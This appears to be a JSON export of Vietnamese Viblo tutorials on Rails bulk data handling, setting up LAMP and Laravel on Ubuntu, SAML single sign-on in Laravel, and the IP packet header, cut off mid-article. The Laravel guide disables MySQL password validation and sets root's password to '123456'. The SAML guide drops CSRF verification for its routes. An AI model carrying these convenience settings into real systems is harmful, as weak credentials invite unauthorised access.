muốn xóa toàn bộ một bảng. Ví dụ như bạn muốn xóa hết user, bạn có thể dùng `TRUNCATE`:\n```ruby\n  ActiveRecord::Base.connection.execute(“TRUNCATE TABLE users”)\n```\nDù sao đi nữa, `delete` ở mức database vẫn rất tốn thời gian. Đây là lí do vì sao đôi khi chúng ta nên dùng \"soft delete\" hay còn gọi là \"xóa mềm\", chỉ cần thay đổi trường “deleted = 1″ của bản ghi muốn xóa là được.\n\n## 8. Không nhất thiết phải chạy lệnh ngay lập tức\n\nHãy dùng \"Background job\". Resque  và Sidekiq luôn bên bạn, hãy dùng chúng để thực thi lệnh ngầm và đặt lịch thực thi lệnh, mọi thứ sẽ trở nên dễ thở hơn nhiểu.\n\n![](https://images.viblo.asia/5b52f036-5950-4e2a-8750-0d0df7688624.png)\n\n\nTóm lại, nếu bạn có một khối lượng lớn dữ liệu, hãy cố gắng hết mức có thể để tối ưu hóa hiệu suất hệ thống. Mặc dù rất tiện nghi, nhưng chúng ta phải thừa nhận rằng ActiveRecord làm chậm hệ thống đi đôi chút. Tuy nhiên, qua những mẹo trên, bạn vẫn có thể giữ được những điểm mạnh khác của Rails mà không lãng phí quá nhiều hiệu suất. Hãy tận hưởng Rails càng nhiều càng tốt!\n\nTham khảo: https://chaione.com/blog/dealing-massive-data-rails/",
        "published_at": "2020-02-11 15:19:31",
        "is_published": true,
        "updated_at": "2020-02-12 20:00:07",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 7,
        "points": 3,
        "views_count": 30,
        "clips_count": 1,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/638d4380-c04e-4db4-b31b-b55e7b37cc0c.png",
        "user": {
            "data": {
                "id": 35803,
                "url": "https://viblo.asia/u/longly123",
                "avatar": null,
                "name": "Lý Bảo Long",
                "username": "longly123",
                "followers_count": 9,
                "reputation": 172,
                "posts_count": 6,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "activerecord",
                    "name": "ActiveRecord",
                    "primary": false,
                    "image": "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=ActiveRecord&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "rails",
                    "name": "Rails",
                    "primary": false,
                    "image": "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=Rails&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38391,
        "title": "Hướng dẫn thiết lập môi trường chạy ứng dụng Laravel trên Ubuntu",
        "slug": "Qbq5Q3PmZD8",
        "url": "https://viblo.asia/p/huong-dan-thiet-lap-moi-truong-chay-ung-dung-laravel-tren-ubuntu-Qbq5Q3PmZD8",
        "user_id": 35753,
        "moderation": null,
        "transliterated": "huong-dan-thiet-lap-moi-truong-chay-ung-dung-laravel-tren-ubuntu",
        "contents_short": "1. Giới thiệu\n\nĐể chạy một project Laravel chúng ta cần một web server. Giống như trên Windows, khi phát triển một ứng dụng Web sẽ sử dụng XAMPP, thì ở trên Ubuntu sẽ có một Web Server tương tự đó ...",
        "contents": "**1. Giới thiệu**\n\nĐể chạy một project Laravel chúng ta cần một web server. Giống như trên Windows, khi phát triển một ứng dụng Web sẽ sử dụng XAMPP, thì ở trên Ubuntu sẽ có một Web Server tương tự đó là LAMP. Tiếp theo, cần cài đặt Composer để cài đặt Laravel. Trong bài viết này, mình sẽ hướng dẫn các bạn cài đặt LAMP, Composer  trên Ubuntu 18.04, các phiên bản khác cũng tương tự, nhưng mình khuyên mọi người nên sử dụng bản Ubuntu mới nhất để có những trải nghiệm người dùng tốt nhất.\n\n**2. LAMP**\n\nLAMP gồm 4 thành phần chính Linux, Apache, MySQL, và PHP hoặc Python hoặc Perl.\n\n* **Linux**: Linux là tên của một hệ điều hành mở và cũng là tên hạt nhân của hệ điều hành. Được ra đời lần đầu tiên vào năm 1994 bởi Linus Torvalds. Ubuntu là hệ điều hành mã nguồn mở dựa trên GNU Debian/Linux. Hiện nay, Ubuntu rất phổ biến và được sử dụng nhiều trong những công ty IT bởi vì đây là hệ điều hành miễn phí (yaoming). Bởi vì mình cài LAMP trên Ubuntu 18.04, chính hệ điều hành cũng là một thành phần của LAMP nên sẽ không cần cài đặt nữa.\n*  **Apache**: Apache là phần mềm web server miễn phí mã nguồn mở. Nó đang chiếm đến khoảng 46% thị phần websites trên toàn thế giới. Tên chính thức của Apache là Apache HTTP Server, được điều hành và phát triển bởi Apache Software Foundation. Sau đây là cách cài đặt Apache trên Ubuntu:\n    \n    * Chạy câu lệnh sau: `$ sudo apt-get install apache2`\n    \n    ![](https://images.viblo.asia/6311e160-ec62-48b1-b618-d69291cfe8cd.png)\n\n    * Sau đó bấm Y để tiếp tục cài đặt. Tiếp theo, mở trình duyệt gõ 127.0.0.1 để kiểm tra Apache đã hoạt động chưa.\n\n    ![](https://images.viblo.asia/83d5bbb6-3612-457e-be93-67c7ea8b21ed.png)\n\n    * Khi trình duyệt hiện ra như trên, đã cài đặt Apache thành công. Tiếp theo sẽ cài đặt MySQL.\n\n* **MySQL**: MySQL là hệ quản trị cơ sở dữ liệu mã nguồn mở, được sử dụng phổ biến rộng rãi trên thế giới. \n    * Sau đây là câu lệnh cài đặt MySQL:  `$ sudo apt-get install mysql-server`\n\n    ![](https://images.viblo.asia/a956d888-98cd-4d2f-80f9-dbadaa4e3ceb.png)\n    \n    * Bấm chọn Y để tiếp tục cài đặt.\n    * Sau khi cài đặt xong, tiếp tục chạy câu lệnh sau: `$ sudo mysql_secure_installation.`\n    \n    ![](https://images.viblo.asia/b10c44ac-aae4-49e4-a790-154d8f562d0e.png)\n    \n    * Ở đây có 2 lựa chọn, nếu chọn Y sẽ sử dụng VALIDATE PASSWORD PLUGIN có nghĩa là bạn phải sử dụng mất khẩu mạnh cho cơ sở dữ liệu, như là độ dài mật khẩu phải trên 8 kí tự, in hoa, in thường, kí tự đặt biệt, etc... Còn nếu chọn N sẽ không sử dụng VALIDATE PASSWORD PLUGIN. Và ở đây cài đặt trên máy cá nhân nên cũng không cần sử VALIDATE PASSWORD PLUGIN. Nên ở đây mình sẽ chọn N để tiện cho việc cài đặt.\n    * Sau khi chọn N, sẽ yêu cầu bạn thiết lập mật khẩu cho MySQL. Ở đây để dễ nhớ mình sẽ đặt là: 123456\n    \n    ![](https://images.viblo.asia/54afc2ba-22a8-4546-b29a-d24fe4d17b83.png)\n\n     * Gõ lại mật khẩu lần nữa. Và ấn Enter.\n     \n    ![](https://images.viblo.asia/22822362-cada-479a-943a-b107939116f7.png)\n    \n     * Tiếp theo chọn Y và ấn Enter.\n\n    ![](https://images.viblo.asia/6d74f186-dc4b-4477-bed5-455a4f9ab2bc.png)\n    \n    * Tiếp theo chọn N và ấn Enter.\n    \n    ![](https://images.viblo.asia/bffea3e6-f422-4af2-ab50-4823d3e15897.png)\n\n    * Tiếp theo chọn Y và Enter.\n\n    ![](https://images.viblo.asia/56a1f210-fa55-4a72-a748-3898ae56f785.png)\n    \n    * Tiếp theo chọn Y và Enter.\n\n    ![](https://images.viblo.asia/306705b4-5a61-41e9-94f4-c697affa1a82.png)\n\n    * Vậy là đã cài đặt xong MySQL. Tiếp theo chạy cậu lệnh sau:`$ mysql -u root -p` để truy cập vào MySQL, root ở đây là username mặc định khi cài đặt MySQL. Bạn cũng thể tự tạo một tài khoản khác để truy cập vào MySQL.\n\n    ![](https://images.viblo.asia/675e629f-4fa2-4ae0-9be9-1dc9daecd0c2.png)\n    \n    * Nhập mật khẩu đã thiết lập trước đó, nếu như hiện thông tin như ảnh trên. Thì chạy câu lệnh sau: `$ sudo mysql`. Để truy cập vào MySQL với quyền root mà không cần mật khẩu cho tài khoản có username là root.\n\n    ![](https://images.viblo.asia/f58af39c-2da9-47bb-bf79-0264427e9c68.png)\n\n    *  Sau khi đăng nhập vào MySQL với quyền root, chạy câu lệnh sau:\n        *   `ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';`. Trường password là để thiết lập lại mật khẩu cho tài khoản root. Ở đây mình sẽ đặt giá trị password là 123456.\n        \n        ![](https://images.viblo.asia/7d737a84-1d22-4fae-ba76-3b0fd66c0589.png)\n        \n        * Tiếp theo chạy câu lệnh:` FLUSH PRIVILEGES;` Mục đích là để reload lại và apply những thay đổi.\n\n        ![](https://images.viblo.asia/199a8a5c-06d3-49bf-8dab-88a2edd064f3.png)\n\n        * Sau đó thoát ra và đăng nhập lại MySQL để kiểm tra thiết lập mật khẩu thành công hay không.\n\n        ![](https://images.viblo.asia/1d3ab55c-7604-48f3-9cc4-3e97835e6b62.png)\n\n        ![](https://images.viblo.asia/04204f28-22bf-4ccd-9367-25acb420fd83.png)\n        \n    * **Vậy là đã cài xong MySQL. Tiếp đến sẽ cài đặt PHP.**\n    \n* **PHP**: Để cài đặt PHP, chạy câu lệnh sau: `$ sudo apt-get install php libapache2-mod-php php-mysql`\n\n    ![](https://images.viblo.asia/704b0875-10bd-4030-9924-b4df690ed6c5.png)\n    \n    * Để kiểm tra PHP đã cài đặt thành công hay chưa, sử dụng câu lệnh: `php -v`.\n\n    ![](https://images.viblo.asia/5a127b0e-2460-40b7-bce4-6ae53caa4ce1.png)\n    \n    * Tiếp cần phải cài đặt một số thư viện cần thiết cho PHP. Ở đây mình cài thư viện mcrypt.\n    * Chạy câu lệnh sau:  `sudo apt install php-dev libmcrypt-dev php-pear`\n    * Sau đó chạy tiếp 2 câu lệnh sau:  `sudo pecl channel-update pecl.php.net` và `sudo pecl install mcrypt-1.0.1`\n    * Sau khi cài đặt xong, chạy câu lệnh sau: `sudo nano /etc/php/7.2/cli/php.ini` và thêm vào file php.ini dòng sau: `extension=mcrypt.so`\n                                                                   \n    ![](https://images.viblo.asia/b7dd1b24-9fc3-406c-865f-39959129bb70.png)\n    \n    * Sau đó `Ctrl + S` và `Ctrl + X` để lưu lại. Để kiểm tra cài đặt thành công hay chưa, sử dụng câu lệnh sau: `php -m | grep mcrypt`. Nếu thành công sẽ hiện ra như sau:\n    \n    ![](https://images.viblo.asia/7747abbf-420f-4f8d-bf47-27d0acb23638.png)\n    \n* **Vậy là đã thiết lập LAMP thành công.**\n\n**3. Composer**\n\nTóm tắt: Composer là công cụ để quả lý package hay library PHP. Composer sẽ cài đặt những libraries vào một thư mục nào đó nằm bên trong project bạn đang làm việc.\n\n* Để tải composer, chạy những câu lệnh sau:\n```\n     php -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"\n     php -r \"if (hash_file('sha384', 'composer-setup.php') === 'c5b9b6d368201a9db6f74e2611495f369991b72d9c8cbd3ffbc63edff210eb73d46ffbfce88669ad33695ef77dc76976') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;\"\n     php composer-setup.php\n     php -r \"unlink('composer-setup.php');\"\n```\n\n* Kiểm tra Composer đã được cài đặt chưa, chạy câu lệnh sau: `php composer.phar`. Nếu cài đặt thành công, sẽ hiển thị như sau:\n\n![](https://images.viblo.asia/4adb9be1-e83f-4112-b86f-77783dd99ec1.png)\n\n* Để có thể ở bất cứ đâu cũng có thể sử dụng Composer, sử dụng câu lệnh sau: `sudo mv composer.phar /usr/local/bin/composer`. Sau đó chạy câu lệnh: `composer`. Để kiểm tra config đã thành công chưa.\n\n![](https://images.viblo.asia/582b4495-9998-4a9f-8c4e-935cecf0346f.png)\n\n**Vậy là đã cài đặt xong Composer**\n\n**4. Laravel**\n\n* Để cài đặt được Laravel, theo tài liệu trang chủ hướng dẫn `https://laravel.com/docs/6.x`, cần có những extension sau:\n\n```\n    PHP >= 7.2.0\n    BCMath PHP Extension\n    Ctype PHP Extension\n    JSON PHP Extension\n    Mbstring PHP Extension\n    OpenSSL PHP Extension\n    PDO PHP Extension\n    Tokenizer PHP Extension\n    XML PHP Extension\n```\n\n* Để kiểm tra xem những extension nào đã được cài rồi, sử dụng câu lệnh sau: `php -m | grep tên extension`. Ví dụ, kiểm tra xem extension BCmath đã có chưa: `php -m | grep bcmath`\n\n![](https://images.viblo.asia/dd73bd6d-d611-445d-a635-1a453dfbfd64.png)\n\n* Nếu chạy xong câu lệnh mà thông báo như trên có nghĩa là extension BCMath chưa được cài đặt. Để cài đặt một extension của php, sử dụng câu lệnh sau: `sudo apt-get install php-bcmath`. Cụ thể, để cài đặt extension BCMath, sử dụng câu lệnh sau: `sudo apt-get install php-bcmath`. Sau đó, chạy lại câu lệnh `php -m | grep bcmath` để kiểm tra xem cài đặt thành công hay chưa.\n\n![](https://images.viblo.asia/3a97e9ce-936a-4496-bfe4-27bd6364b611.png)\n \n * Như vậy, đã cài đặt tthành công extension BCMath. Những extension còn lại, làm theo tương tự.\n * Tiếp theo, cài đặt Laravel thông qua Composer. Chạy câu lệnh sau: `composer global require laravel/installer`\n * Sau khi chạy xong. Chạy câu lệnh: `laravel`, nếu như ở command line hiện nên là: laravel: `command not found`, sẽ cần phải làm theo những bước sau:\n     * Chạy câu lệnh: `sudo nano ~/.bashrc `\n     * Tiếp theo: Thêm dòng sau vào cuối file `export PATH=\"~/.config/composer/vendor/bin:$PATH\"`\n     * `Ctrl + S và Ctrl + X` để lưu lại.\n     * Cuối cùng, chạy câu lệnh: `source ~/.bashrc`\n* Khi thực hiện xong những bước trên, chạy lại câu lệnh `laravel` để kiểm tra.\n\n![](https://images.viblo.asia/8d15d604-e731-4f52-85f4-acf268fd7f2d.png)\n\n* Vậy là đã thiết lập thành công.\n\n**4. Lời kết**\n\nHy vọng bài hướng dẫn này sẽ giúp mọi người có thể thiết lập môi trường thành công và bắt tay vào việc làm quen với `Laravel`. Happy Coding!!!",
        "published_at": "2020-02-11 15:07:52",
        "is_published": true,
        "updated_at": "2020-02-12 20:00:07",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 8,
        "points": 2,
        "views_count": 42,
        "clips_count": 0,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/6311e160-ec62-48b1-b618-d69291cfe8cd.png",
        "user": {
            "data": {
                "id": 35753,
                "url": "https://viblo.asia/u/adolf_hittl3r",
                "avatar": "8221a8b5-98d0-4dae-a8b4-f8be461ffbb3.jpeg",
                "name": "Le Duc",
                "username": "adolf_hittl3r",
                "followers_count": 3,
                "reputation": 83,
                "posts_count": 6,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "ubuntu-1804",
                    "name": "Ubuntu 18.04",
                    "primary": false,
                    "image": "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=Ubuntu+1804&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38396,
        "title": "Single sign-on bằng SAML với Laravel 5",
        "slug": "bJzKmxEr59N",
        "url": "https://viblo.asia/p/single-sign-on-bang-saml-voi-laravel-5-bJzKmxEr59N",
        "user_id": 38995,
        "moderation": null,
        "transliterated": "single-sign-on-bang-saml-voi-laravel-5",
        "contents_short": "Giới thiệu\nĐây là những memo khi sử dụng Single sign-on bằng SAML cho Laravel 5.\n\nPhần lớn nội dung là giống với README của laravel-saml2.\n\nMôi trường\nHoạt động từ Laravel 5.4 trở về sau.\n\nCài đặt ...",
        "contents": "# Giới thiệu\nĐây là những memo khi sử dụng Single sign-on bằng SAML cho Laravel 5.\n\nPhần lớn nội dung là giống với README của laravel-saml2.\n\n# Môi trường\nHoạt động từ Laravel 5.4 trở về sau.\n\n# Cài đặt\n## Cài đặt laravel-saml2\n`composer require aacotroneo/laravel-saml2`\n\nVới các phiên bản Laravel trước 5.5, thì cần thêm Service Provider vào `config\\app.php` như bên dưới:\n\nconfig\\app.php\n```\n'providers' => [\n        ...\n        Aacotroneo\\Saml2\\Saml2ServiceProvider::class,\n]\n\n'alias' => [\n        ...\n        'Saml2' => Aacotroneo\\Saml2\\Facades\\Saml2Auth::class,\n]\n```\n\nThực hiện vendor:publish\n`php artisan vendor:publish --provider=\"Aacotroneo\\Saml2\\Saml2ServiceProvider\"`\n`app\\config\\saml2_settings.php` sẽ được tạo ra.\n\n## Tạo Laravel authenticataion\nTạo Auth cho Laravel\n```\nphp artisan make:auth\nphp artisan migrate\n```\n\n# Cài đặt SAML\n## Đăng ký metadata vào Idp\nXác nhận metadata SAML của phía Laravel (SAML SP) theo link bên dưới, sau đó đăng ký vào phía IdP.\n\n`http://localhost/Laravel-app-name/public/saml2/metadata`\n\n## Thiết lập metadata IdP cho Laravel\nThiết lập metadata IdP vào `saml2_settings.php` của phía Laravel.\n\nChỉ định các biến môi trường entityId, singleSignOnService, singleLogoutService, x509cert.\n\nChỗ này là đang sử dụng IdP Google.\n\napp\\config\\saml2_settings.php\n```\n// Identity Provider Data that we want connect with our SP\n    'idp' => array(\n        // Identifier of the IdP entity  (must be a URI)\n        'entityId' => 'https://accounts.google.com/o/saml2?idpid=****',\n        // SSO endpoint info of the IdP. (Authentication Request protocol)\n        'singleSignOnService' => array(\n            // URL Target of the IdP where the SP will send the Authentication Request Message,\n            // using HTTP-Redirect binding.\n            'url' => 'https://accounts.google.com/o/saml2/idp?idpid=****',\n\n        ),\n        // SLO endpoint info of the IdP.\n        'singleLogoutService' => array(\n            // URL Location of the IdP where the SP will send the SLO Request,\n            // using HTTP-Redirect binding.\n            'url' => 'https://accounts.google.com/Logout',\n        ),\n        // Public x509 certificate of the IdP\n        'x509cert' => '****',\n        /*\n         *  Instead of use the whole x509cert you can use a fingerprint\n         *  (openssl x509 -noout -fingerprint -in \"idp.crt\" to generate it)\n         */\n        // 'certFingerprint' => '',\n```\n\n## Thay đổi routesMiddleware\nVì Login session chưa được tạo ra khi thêm VerifyCsrfToken, nên phải thay đổi routesMiddleware của `saml2_settings.php` như bên dưới:\n\napp\\config\\saml2_settings.php\n`'routesMiddleware' => ['saml'],`\n\n\nThêm Middle ware group SAML mới vào Kernel.php.\n\nNội dung của saml group sau khi bỏ VerifyCsrfToken ra khỏi web group.\n\napp\\Http\\Kernel.php\n```\nprotected $middlewareGroups = [\n        'web' => [\n            \\App\\Http\\Middleware\\EncryptCookies::class,\n            \\Illuminate\\Cookie\\Middleware\\AddQueuedCookiesToResponse::class,\n            \\Illuminate\\Session\\Middleware\\StartSession::class,\n            // \\Illuminate\\Session\\Middleware\\AuthenticateSession::class,\n            \\Illuminate\\View\\Middleware\\ShareErrorsFromSession::class,\n            \\App\\Http\\Middleware\\VerifyCsrfToken::class,\n            \\Illuminate\\Routing\\Middleware\\SubstituteBindings::class,\n        ],\n\n        'api' => [\n            'throttle:60,1',\n            'bindings',\n        ],\n\n        // samlグループを追加\n        'saml' => [\n            \\App\\Http\\Middleware\\EncryptCookies::class,\n            \\Illuminate\\Cookie\\Middleware\\AddQueuedCookiesToResponse::class,\n            \\Illuminate\\Session\\Middleware\\StartSession::class,\n            \\Illuminate\\View\\Middleware\\ShareErrorsFromSession::class,\n            \\Illuminate\\Routing\\Middleware\\SubstituteBindings::class,\n        ],\n    ];\n```\n\n# Tạo phần authentication\n## Tạo Event listen cho SAML login và logout\nMô tả event khi SAML login và logout.\n\nVì liên kết với Auth của Laravel nên sẽ làm như sau:\n\n*   Khi SAML login thì Auth cũng login\n*   Khi SAML logout thì Auth cũng logout\n  \nThêm method boot vào `EventServiceProvider.php`\napp\\Providers\\EventServiceProvider.php\n```\n Event::listen('Aacotroneo\\Saml2\\Events\\Saml2LoginEvent', function (Saml2LoginEvent $event) {\n            $messageId = $event->getSaml2Auth()->getLastMessageId();\n        // your own code preventing reuse of a $messageId to stop replay attacks\n        $user = $event->getSaml2User();\n\n        // 属性からUserモデルを取得する\n        $userData = [\n            'id' => $user->getUserId(),\n            'attributes' => $user->getAttributes(),\n            'assertion' => $user->getRawSamlAssertion()\n        ];\n        $laravelUser = \\App\\User::where('email', $userData['attributes']['emailAddress'])->first();\n\n        //if it does not exist create it and go on  or show an error message\n        if ($laravelUser) {\n            Auth::login($laravelUser);\n        } else {\n            abort(401, 'Authorization Required');\n        }\n        });\n\nEvent::listen('Aacotroneo\\Saml2\\Events\\Saml2LogoutEvent', function ($event) {\n            Auth::logout();\n            Session::save();\n        });\n```\nĐồng bộ các thuộc tính thu được với môi trường.\nNếu xảy ra lỗi 401 khi xác thực thì sử dụng view 401 tương ứng như link ở dưới:\n`app\\resources\\views\\errors\\401.blade.php`\n\n## Tạo Middleware SAML authentication\nTạo Middleware để xác thực SAML.\nBằng việc sử sụng Middleware này, cần login SAML để truy cập đến các pages.\n\nSử dụng lênh artisan để tạo Middleware tên SamlAuth.\n\n`php artisan make:middleware SamlAuth`\n\nChỉnh sửa SamlAuth.php như sau:\n\napp\\Http\\Middleware\\SamlAuth.php\n```\n<?php\n\nnamespace App\\Http\\Middleware;\n\nuse Closure;\nuse Illuminate\\Support\\Facades\\Auth;\nuse Illuminate\\Support\\Facades\\URL;\nuse Aacotroneo\\Saml2\\Facades\\Saml2Auth;\n\nclass SamlAuth\n{\n\n    /**\n     * Handle an incoming request.\n     *\n     * @param  \\Illuminate\\Http\\Request  $request\n     * @param  \\Closure  $next\n     * @return mixed\n     */\n    public function handle($request, Closure $next)\n    {\n\n        // SAMLログイン認証\n        if (Auth::guest()) {\n            if ($request->ajax()) {\n                return response('Unauthorized.', 401);\n            } else {\n                Saml2Auth::login(URL::full());\n            }\n        }\n        return $next($request);\n    }\n\n}\n```\n\n\nĐăng ký SamlAuth vào routeMiddleware của Kernel.php.\n\napp\\Http\\Kernel.php\n```\n    protected $routeMiddleware = [\n        'auth' => \\Illuminate\\Auth\\Middleware\\Authenticate::class,\n        'auth.basic' => \\Illuminate\\Auth\\Middleware\\AuthenticateWithBasicAuth::class,\n        'bindings' => \\Illuminate\\Routing\\Middleware\\SubstituteBindings::class,\n        'can' => \\Illuminate\\Auth\\Middleware\\Authorize::class,\n        'guest' => \\App\\Http\\Middleware\\RedirectIfAuthenticated::class,\n        'throttle' => \\Illuminate\\Routing\\Middleware\\ThrottleRequests::class,\n        // 追加\n        'samlauth' => \\App\\Http\\Middleware\\SamlAuth::class,\n    ];\n```\n\n# Sử dụng authentication\nSử dụng Middleware authentication.\n\nBên dưới là 1 ví dụ của việc sử dụng middleware cho route group.\n```\nRoute::middleware(['samlauth'])->group(function () {\n    Route::get('/home', 'HomeController@index');\n});\n```\n\n# Kiểm tra hoạt động\nTạo data user có email và IdP tại table Users.\n\nTruy cập vào /home, sẽ xuất hiện màn hình login IdP.\n\nTiến hành login bằng email address.\n\n# Tham khảo\n[Laravel 5 でSAMLシングルサインオンする](https://qiita.com/kumapo0313/items/b32daf108d250555382f)",
        "published_at": "2020-02-11 13:44:01",
        "is_published": true,
        "updated_at": "2020-02-12 20:00:07",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 2,
        "points": 0,
        "views_count": 48,
        "clips_count": 0,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "en",
        "is_video": false,
        "thumbnail_url": null,
        "user": {
            "data": {
                "id": 38995,
                "url": "https://viblo.asia/u/DuyLe",
                "avatar": null,
                "name": "DuyLe",
                "username": "DuyLe",
                "followers_count": 0,
                "reputation": 0,
                "posts_count": 2,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "laravel-5",
                    "name": "laravel 5",
                    "primary": false,
                    "image": "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=laravel+5&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "saml",
                    "name": "saml",
                    "primary": false,
                    "image": "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=saml&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38352,
        "title": "Tìm hiểu giao thức IP (Phần 1)",
        "slug": "bJzKmxer59N",
        "url": "https://viblo.asia/p/tim-hieu-giao-thuc-ip-phan-1-bJzKmxer59N",
        "user_id": 26491,
        "moderation": null,
        "transliterated": "tim-hieu-giao-thuc-ip-phan-1",
        "contents_short": "Các máy tính trên mạng \"nói chuyện\" với nhau thông qua một ngôn ngữ đặc biệt gọi các giao thức mạng. Có nhiều giao thức khác nhau và mỗi giao thức đều có một nhiệm vụ riêng  như:\n- Giao thức truyền...",
        "contents": "Các máy tính trên mạng \"nói chuyện\" với nhau thông qua một ngôn ngữ đặc biệt gọi các giao thức mạng. Có nhiều giao thức khác nhau và mỗi giao thức đều có một nhiệm vụ riêng  như:\n- Giao thức truyền dữ liệu, dùng để vận chuyển dữ liệu giữa 2 máy tính.\n- Giao thức xử lý dữ liệu có nhiệm vụ xử lý dữ liệu nhận được từ giao thức truyền dữ liệu.\n\nGiao thức IP là một giao thức của chồng giao thức TCP/IP thuộc tầng mạng. Mọi người có thể đọc bài [Tìm hiểu cơ bản về mô hình TCP/IP](https://viblo.asia/p/tim-hieu-co-ban-ve-mo-hinh-tcpip-RQqKLkJp57z) để biết chức năng của tầng mạng là gì nhé! Và hôm nay mình sẽ giới thiệu thêm về giao thức IP. Cùng tìm hiểu nhé!:wink:\n\n# Đặc điểm của giao thức IP\n* Là 1 trong những giao thức quan trọng nhất của bộ giao thức TPC/IP.\n*  Là giao thức hướng không liên kết (connectionless): dữ liệu của IP được truyền đi ngay lập tức nếu có thể (best effort), không có bất kì cơ chế thiết lập kết nối , không có cơ chế báo nhận hay điều khiển luồng nào được sử dụng với IP, các gói tin IP cũng không được đánh số thứ tự khi trao đổi trên mạng… \n*  Mỗi gói tin IP được xử lý một cách hoàn toàn độc lập với các gói tin IP khác .\n*  Giao thức IP sử dụng cơ chế định địa chỉ theo kiểu phân cấp, trong đó phần NetworkId của địa chỉ giống như tên của một con đường và phần hostId của địa chỉ sẽ là số nhà của một căn nhà trên con đường ấy.\n*  Không có cơ chế khôi phục lại gói tin bị mất trên đường truyền. Việc này được giao lại cho các giao thức tầng trên để đảm bảo độ tin cậy (TCP)\n# Cấu trúc gói tin\nGồm 2 phần là Header và data. *Header* chứa thông tin quản lý của gói tin, *data* là phần dữ liệu cần truyền tải được đóng gói trong gói tin IP\n\n![](https://images.viblo.asia/d16966f4-c811-48b3-825b-7728507ef05d.png)\n\n*  **VERS (4 bit)**: chỉ ra phiên bản hiện hành của IP đang được dùng, Nếu trường này khác với phiên bản IP của thiết bị nhận, thiết bị nhận sẽ từ chối và loại bỏ các gói tin này.\n*  **HLEN (IP Header Length - 4 bit):**  chỉ độ dài phần tiêu đề của datagram, tính theo đơn vị word (32 bits). Nếu không có trường này thì độ dài mặc định của header là 5 từ.\n*  **Service Type (8 bit)**: đánh dấu dữ liệu (marking) phục vụ cho tác vụ QoS với các gói tin IP\n >  **QoS (Quality of Service)** là tập hợp các kĩ thuật cho phép cấp phát các tài nguyên một cách thích hợp cho các loại dữ liệu khác nhau, từ đó có thể đảm bảo chất lượng dịch vụ mạng cho các loại dữ liệu này .\n*  **Precedence (3 bit)**: chỉ thị quyền ưu tiên gửi datagram, cụ thể:\n\n|Priority  | Main |\n| -------- | -------- |\n |111     | Network Control (cao nhất)     |\n  |011     | flash     |\n|110     | Internetwork Control     |\n|010     | Immediate     |\n|101     | CRITIC/ECP     |\n|001     | Priority     |\n|100     | Flas Override     |\n|000     | Routine (thấp nhất)     |\n\n*  **Delay (1 bit)** : chỉ độ trễ yêu cầu. *0*: độ trễ bình thường; *1*: độ trễ thấp\n*  **Throughput (1 bit)** : chỉ số thông lượng yêu cầu.  *0*: thông lượng bình thường;  *1*: thông lượng cao\n*  **Reliability (1 bit)**: chỉ độ tin cậy yêu cầu. *0*: độ tin cậy bình thường; *1*: độ tin cậy cao\n\n* **Total Length (16 bit)**: chiều dài của toàn bộ gói tin IP kể cả phần header được tính theo byte. Để biết chiều dài của dữ liệu cần lấy tổng chiều dài này trừ đi HLEN.\n* **Identification (16 bit)**:  Trường định danh, cùng các tham số khác như địa chỉ nguồn (Source address) và địa chỉ đích (Destination address) để định danh duy nhất cho mỗi Datagram được gửi đi bởi 1 trạm. Thông thường phần định danh được tăng thêm 1 khi 1 Datagram được gửi đi.\n* **Flags (3 bit)**: Cờ sử dụng trong khi phân đoạn các Datagram.\n    * Bit 0: reserved chưa sử dụng, giá trị luôn là 0.\n    * Bit 1: *DF = 1*: Gói tin bị phân đoạn, có nhiều hơn 1 đoạn, *DF = 0*: Gói tin ko bị phân đoạn.\n    * Bit 2: *MF = 0:* đoạn cuối cùng, *MF = 1*: chưa là đoạn cuối cùng, còn đoạn khác phía sau nữa.\n\n* **Fragment Offset (13 bit):** Chỉ vị trí của đoạn phân mảnh (Fragment) trong IP Datagram tính theo đơn vị 64 Bit. \n* **Time to Live (TTL) (8 bit)**: sử dụng để chống loop gói tin IP khi xảy ra lỗi định tuyến trên sơ đồ mạng. Giá trị này được đặt lúc bắt đầu gửi gói tin và nó sẽ giảm đi 1 đơn vị khi đi qua 1 router. Khi TTL = 0, gói tin sẽ bị loại bỏ.\n* **Protocol (8 bit)**: nhận dạng giao thức nào đang được truyền tải trong phần data của gói tin IP, như TCP hay UDP.\n* **Header checksum (8 bit)**: kiểm tra lỗi của IP Header. Nếu như việc kiểm tra này thất bại, gói dữ liệu sẽ bị huỷ bỏ tại nơi xác định được lỗi.\n* **Source Address (32 bit)**: địa chỉ của trạm nguồn.\n* **Destination Address (32 bit)**: địa chỉ của trạm đích.\n* **Option (có độ dài thay đổi)**: cho phép thêm vào tính năng 